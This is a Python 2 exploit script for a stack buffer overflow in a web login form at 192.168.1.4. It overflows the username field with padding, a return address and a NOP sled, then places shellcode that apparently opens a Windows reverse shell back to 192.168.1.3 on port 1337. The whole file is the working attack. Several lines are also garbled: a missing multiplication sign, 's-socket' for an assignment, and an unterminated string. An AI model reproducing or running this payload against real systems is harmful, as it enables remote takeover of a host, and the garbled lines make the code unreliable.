import socket
# badchars is "\x00\x0a\xad\x25\x26\x2b\x3d"
# Message 0x1009083
shell=""
shell+="\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30" 
shell+="\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff" 
shell+="\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52" 
shell+="\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1" 
shell+="\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b" 
shell+="\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03" 
shell+="\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b" 
shell+="\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24" 
shell+="\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb" 
shell+="\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c" 
shell+="\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68" 
shell+="\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68" 
shell+="\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x01\x03\x68" 
shell+="\x02\x00\x05\x39\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61" 
shell+="\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\x65\xa2" 
shell+="\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6" 
shell+="\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44" 
shell+="\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56" 
shell+="\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff" 
shell+="\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6" 
shell+="\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
shell+="\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";

#1500 
buffer="A" 780+"\x83\x0c\x09\x10"+'\x90'*100+shell+'\x90' *(1500-780-4-100-len(shell))
payload="username="+buffer+ "&password=1234"


request=""
request+="POST /login HTTP/1.1\r\n"
request+="Host: 192.168.1.4\r\n"
request+="User-Agent: Mozilla/5.0 (X11; Linux x86 64; rv:68.0) Gecko/20100101 Firefox/
request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
request+="Accept-Language: en-US,en;q=0.5\r\n" 
request+="Accept-Encoding: gzip, deflate\r\n"
request+="Referer: http://192.168.1.4/login\r\n"
request+="Content-Type: application/x-www-form-urlencoded\r\n" 
request+="Content-Length: "+str(len(payload))+"\r\n"
request+="Connection: keep-alive\r\n"
request+="Upgrade-Insecure-Requests: 1\r\n"
request+="\r\n"
request+= payload

print request
s-socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.connect(("192.168.1.4",80))
s.send(request) 
print s.recv(1024)
s.close() 